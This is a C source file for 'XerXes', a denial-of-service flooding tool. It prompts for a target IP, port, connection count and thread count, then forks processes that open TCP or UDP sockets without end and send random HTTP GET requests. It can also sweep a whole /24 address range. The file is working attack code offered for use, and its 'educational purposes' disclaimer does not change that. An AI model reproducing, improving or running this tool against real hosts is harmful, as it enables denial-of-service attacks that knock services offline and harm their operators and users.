/* XerXes - Most powerful dos tool - THN (http://www.thehackernews.com) */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

int Threads = 0;
int Connections = 0;

int make_socket(char *host, char *port, int modus) 
{
	struct addrinfo hints, *servinfo, *p;
	int sock, r;
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;

	if(modus)
	  hints.ai_socktype = SOCK_STREAM;//TCP
	else
	  hints.ai_socktype = SOCK_DGRAM;//UDP

	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) 
	{
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) 
	{
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) 
			continue;
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) 
		{
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) 
	{
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made: %s\n", host);
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}

void broke(int s) 
{
	// do nothing
}

void attack(char *host, char *port, int id, int modus) 
{
	int sockets;
	int r, i, n, buf;
	int x = 0;
	char string[100];
	static int j = 0;
	char httpbuf[2024];
	char s_copy[132];

	sockets = 0;
	signal(SIGPIPE, &broke);

	while(1) 
	{	
		x = 0;
		while(x != Connections)
		{
			if(sockets == 0)
				sockets = make_socket(host, port, modus);
    
			srand(time(NULL));
			for( j = 0; j < 99; j++)
        		string[j] = 'A' + rand()%26; // starting on '0', ending on '}'	
	
			sprintf(httpbuf, "GET /%s HTTP/1.0\r\n\r\n", string);
			strncpy(s_copy, httpbuf, sizeof(s_copy));
			int sizebuf = sizeof s_copy - 1;
			r=write(sockets, s_copy, sizebuf);
			close(sockets);
			sockets = make_socket(host, port, modus);
			fprintf(stderr, "Thread:%i Connection:%d %s", id,x,s_copy);
			x++;
		}
		usleep(100000);
	}
}
int force(char *host, int modus, char *port)
{
	char *i;
	char *p;
	int stelle;
	int x = 0;

	p = host;
	i = strrchr(host, 46);
  stelle = (i - p) + 1;

  if(host[stelle] != '\0')
    return 0;
	
	for(int l=0; l <= 2; l++)
	{
		if(l != 0)
			host[stelle] = 48 + l;
		for(int k=0; k <= 9; k++)
		{
			if(k != 0 && l == 0)
        host[stelle] = 48 + k;
      if(k != 0 && l != 0)
        host[stelle + 1] = 48 + k;
      if(k == 0 && l != 0)
        host[stelle + 1] = 48 + k;
      if(l == 2 && k == 6)
        break;
      for(int j=48; j <= 57; j++)
      {
        if(k == 0 && l == 0)
          host[stelle] = j;
        else if(l == 0 && k != 0)
          host[stelle + 1] = j;
        else
          host[stelle + 2] = j;
        if(l == 2 && k == 5 && j == 53)
          break;
				while(x != Threads)
				{	
					printf("Start IP: %s\n", host);
					++x;
					if(fork())
						attack(host, port, x, modus);
					usleep(100000);
				}
				x = 0;
      }
		}
	}
}
int main(int argc, char **argv) 
{
	int x = 0;
	int modus;
	char ip[30];
	char port[6]; 

    printf("!!This tool is for educational purposes, I take no responsibility for its misuse!!\n");
	printf("Modus:MemAMPDDoD by: M.B. Hudson (hose from 0 to 3) =====> 0=UDP 1=TCP with HTTP Requests\n");
	  scanf("%d", &modus);
	printf("ENTER IP or TARGET or Brute Force a range by added /24 at the end of TARGET URL =====>\n");
    scanf("%s", &ip);
	printf("ENTER ATTACK Port =====>\n");
    scanf("%s",&port);
	printf("How Many Connections? (example: 20) ======>\n");
    scanf("%d",&Connections);
	printf("How Many Thread Per Connection? =====> \n");
    scanf("%d",&Threads);
  
	if(!(force(ip, modus, port)))
	{	
		while(x != Threads)
		{	
			++x;
			if(fork())
				attack(ip, port, x, modus);
			usleep(100000);
		}
	}
	getc(stdin);
	return 0;
}
